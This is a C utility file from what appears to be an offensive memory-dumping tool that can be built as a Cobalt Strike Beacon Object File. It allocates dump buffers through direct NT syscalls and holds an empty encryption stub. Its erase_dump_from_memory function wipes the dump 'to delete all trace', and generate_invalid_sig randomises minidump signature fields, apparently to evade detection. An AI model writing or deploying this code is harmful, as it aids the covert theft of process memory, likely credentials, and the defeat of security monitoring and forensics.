#include "../include/utils.h"
#include "../include/syscalls.h"

void free_linked_list(
    PVOID head
)
{
    if (!head)
        return;

    Plinked_list node = (Plinked_list)head;
    ULONG32 number_of_nodes = 0;
    while (node)
    {
        number_of_nodes++;
        node = node->next;
    }

    for (int i = number_of_nodes - 1; i >= 0; i--)
    {
        Plinked_list node = (Plinked_list)head;

        int jumps = i;
        while (jumps--)
            node = node->next;

        intFree(node); node = NULL;
    }
}

PVOID allocate_memory(
    PSIZE_T RegionSize
)
{
    PVOID BaseAddress = NULL;
    NTSTATUS status = NtAllocateVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        0,
        RegionSize,
        MEM_COMMIT,
        PAGE_READWRITE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Could not allocate enough memory to write the dump\n"
        );
#endif
        return NULL;
    }
    return BaseAddress;
}

void encrypt_dump(
    Pdump_context dc
)
{
    // add your code here
    return;
}

void erase_dump_from_memory(
    Pdump_context dc
)
{
    // delete all trace of the dump from memory
    memset(dc->BaseAddress, 0, dc->rva);
    // free the memory area where the dump was
    PVOID BaseAddress = dc->BaseAddress;
    SIZE_T RegionSize = dc->DumpMaxSize;
    NTSTATUS status = NtFreeVirtualMemory(
        NtCurrentProcess(),
        &BaseAddress,
        &RegionSize,
        MEM_RELEASE
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtFreeVirtualMemory, status: 0x%lx\n",
            status
        );
#endif
    }
}

void generate_invalid_sig(
    PULONG32 Signature,
    PSHORT Version,
    PSHORT ImplementationVersion
)
{
    time_t t;
    srand((unsigned) time(&t));

    *Signature = MINIDUMP_SIGNATURE;
    *Version = MINIDUMP_VERSION;
    *ImplementationVersion = MINIDUMP_IMPL_VERSION;
    while (*Signature == MINIDUMP_SIGNATURE ||
           *Version == MINIDUMP_VERSION ||
           *ImplementationVersion == MINIDUMP_IMPL_VERSION)
    {
        *Signature = 0;
        *Signature |= (rand() & 0x7FFF) << 0x11;
        *Signature |= (rand() & 0x7FFF) << 0x02;
        *Signature |= (rand() & 0x0003) << 0x00;

        *Version = 0;
        *Version |= (rand() & 0xFF) << 0x08;
        *Version |= (rand() & 0xFF) << 0x00;

        *ImplementationVersion = 0;
        *ImplementationVersion |= (rand() & 0xFF) << 0x08;
        *ImplementationVersion |= (rand() & 0xFF) << 0x00;
    }
}
